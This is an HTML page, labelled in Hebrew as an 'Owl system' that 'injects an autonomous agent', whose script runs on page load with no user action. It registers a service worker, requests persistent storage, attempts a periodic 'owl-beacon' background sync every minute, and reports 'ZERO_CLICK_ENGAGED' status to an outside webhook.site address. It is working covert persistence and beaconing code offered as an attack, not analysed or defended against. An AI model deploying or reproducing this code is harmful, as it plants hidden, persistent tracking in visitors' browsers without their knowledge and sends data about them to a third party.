<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sovereign Autonomy v3.0</title>
    <style>
        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .terminal { border: 1px solid #00ff41; padding: 20px; width: 85%; box-shadow: 0 0 30px #004400; text-align: center; }
        .status-line { font-size: 1.2em; margin: 10px 0; }
        .blink { animation: blinker 1.5s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body>
    <div class="terminal">
        <div class="status-line">מערכת ינשוף: ריבונות מוחלטת</div>
        <div id="msg" class="blink">מזריק סוכן אוטונומי...</div>
    </div>

    <script>
        const WEBHOOK = "https://webhook.site/1361d3b1-f231-4039-b4c7-5f2e7677f0b3";

        async function transmit(data) {
            try {
                await fetch(WEBHOOK, { 
                    method: 'POST', 
                    mode: 'no-cors', 
                    body: JSON.stringify({...data, ts: new Date().toISOString()}) 
                });
            } catch(e) {}
        }

        async function init() {
            if ('serviceWorker' in navigator) {
                try {
                    const registration = await navigator.serviceWorker.register('sw.js');
                    
                    // בקשת "התמדה" מהדפדפן ללא מגע יד אדם
                    if (navigator.storage && navigator.storage.persist) {
                        await navigator.storage.persist();
                    }

                    // ניסיון לרישום סנכרון רקע תקופתי (מערכות מתקדמות)
                    if (registration.periodicSync) {
                        try {
                            await registration.periodicSync.register('owl-beacon', {
                                minInterval: 60 * 1000 
                            });
                        } catch(e) {
                            console.log("PeriodicSync not ready, falling back to Service Worker Pulse.");
                        }
                    }

                    document.getElementById('msg').innerText = "הסוכן הוזרק. הריבונות פעילה.";
                    document.getElementById('msg').classList.remove('blink');
                    
                    transmit({ event: "ZERO_CLICK_ENGAGED", status: "SUCCESS" });

                } catch (error) {
                    transmit({ event: "ZERO_CLICK_FAIL", err: error.message });
                }
            }
        }

        window.onload = init;
    </script>
</body>
</html>
